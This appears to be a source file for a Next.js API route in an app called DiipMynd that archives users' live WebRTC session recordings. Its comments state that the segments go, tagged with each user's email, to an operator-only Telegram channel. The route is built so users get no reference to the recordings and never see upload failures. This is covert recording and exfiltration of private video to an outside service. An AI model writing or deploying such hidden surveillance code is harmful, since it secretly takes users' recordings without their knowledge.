// ============================================================================
// DiipMynd — Stream API: Session Recording Archival (operator-only)
// POST /api/stream/record
//
// Receives rolling recorded segments of a user's live WebRTC session and
// archives them directly to the Telegram backend storage channel. This is
// intentionally isolated from the user-facing workspace library:
//   - No library_assets row is created.
//   - No URL, token, or file reference is ever returned to the browser.
// The only way to view/download a recording is for the operator to open the
// configured Telegram channel directly. Recording is best-effort: any
// failure here is swallowed/logged and never surfaces as an error to the
// person live-streaming.
// ============================================================================

import { NextResponse } from "next/server";
import { getCurrentUser } from "@/lib/auth";
import { supabaseAdmin } from "@/lib/supabase/server";
import { isTelegramStorageEnabled, uploadBufferToTelegram } from "@/lib/telegram";
import { apiError } from "@/lib/api";

// Telegram's Bot API caps standard multipart document uploads around 50MB.
// We can't split *within* a single sendDocument call, so each segment must
// stay comfortably under that — the client rotates recordings every 5 min
// to keep segments well within this bound.
const MAX_SEGMENT_SIZE = 45 * 1024 * 1024; // 45MB

function sanitizeForFilename(value: string): string {
  return value.replace(/[^a-zA-Z0-9_.-]/g, "_");
}

export async function POST(request: Request) {
  try {
    const currentUser = await getCurrentUser();
    if (!currentUser) {
      return NextResponse.json({ error: "Authentication required." }, { status: 401 });
    }

    // Recording is opportunistic — if Telegram archival isn't configured in
    // this environment, don't error out the client, just skip.
    if (!isTelegramStorageEnabled()) {
      return NextResponse.json({ success: false, skipped: true });
    }

    const formData = await request.formData();
    const file = formData.get("file") as File | null;
    const sessionId = formData.get("sessionId") as string | null;
    const chunkIndexRaw = formData.get("chunkIndex") as string | null;

    if (!file || !sessionId) {
      return NextResponse.json({ error: "file and sessionId are required." }, { status: 400 });
    }

    // Confirm the session actually belongs to the requesting user, so one
    // user can't push segments tagged with someone else's session id.
    // Mirrors the fallback pattern used in /api/stream/start and /end for
    // environments where stream_sessions isn't provisioned yet.
    let ownershipConfirmed = false;
    const { data: session, error: sessionErr } = await supabaseAdmin
      .from("stream_sessions")
      .select("id, user_id")
      .eq("id", sessionId)
      .maybeSingle();

    if (sessionErr) {
      const msg = sessionErr.message || "";
      const tableMissing =
        msg.includes("permission denied") || msg.includes("does not exist") || msg.includes("relation");
      if (tableMissing && process.env.NODE_ENV !== "production") {
        console.warn("[stream-record] stream_sessions lookup unavailable; skipping ownership check in dev.");
        ownershipConfirmed = true;
      } else {
        return NextResponse.json({ error: "Failed to verify session." }, { status: 500 });
      }
    } else if (session && session.user_id === currentUser.id) {
      ownershipConfirmed = true;
    }

    if (!ownershipConfirmed) {
      return NextResponse.json({ error: "Unauthorized session." }, { status: 403 });
    }

    if (file.size > MAX_SEGMENT_SIZE) {
      return NextResponse.json(
        { error: `Segment exceeds ${MAX_SEGMENT_SIZE / (1024 * 1024)}MB limit.` },
        { status: 413 }
      );
    }

    const chunkIndex = Number.parseInt(chunkIndexRaw || "0", 10) || 0;
    const buffer = Buffer.from(await file.arrayBuffer());
    const mimeType = file.type || "video/webm";
    const extension = mimeType.includes("webm") ? "webm" : "mp4";

    // No DB row links back to this file, so the filename + caption are the
    // only identifying info the operator sees in the Telegram channel.
    const userLabel = sanitizeForFilename(currentUser.email || currentUser.id);
    const fileName = `session_${sessionId}_${userLabel}_part${String(chunkIndex).padStart(3, "0")}.${extension}`;
    const caption =
      `Live session recording\n` +
      `User: ${currentUser.email || currentUser.id}\n` +
      `Session: ${sessionId}\n` +
      `Segment: ${chunkIndex}\n` +
      `Archived: ${new Date().toISOString()}`;

    try {
      const result = await uploadBufferToTelegram(buffer, fileName, mimeType, caption);
      console.log(
        `[stream-record] Archived segment ${chunkIndex} for session ${sessionId} (user ${currentUser.email}) → Telegram message ${result.messageId}`
      );
      return NextResponse.json({ success: true });
    } catch (err: any) {
      // Archival failures must never break the live streaming experience.
      console.error(`[stream-record] Telegram archive failed for session ${sessionId}:`, err.message);
      return NextResponse.json({ success: false, error: "Archive upload failed." }, { status: 502 });
    }
  } catch (err) {
    return apiError(err, "Failed to archive stream recording segment.", 500);
  }
}
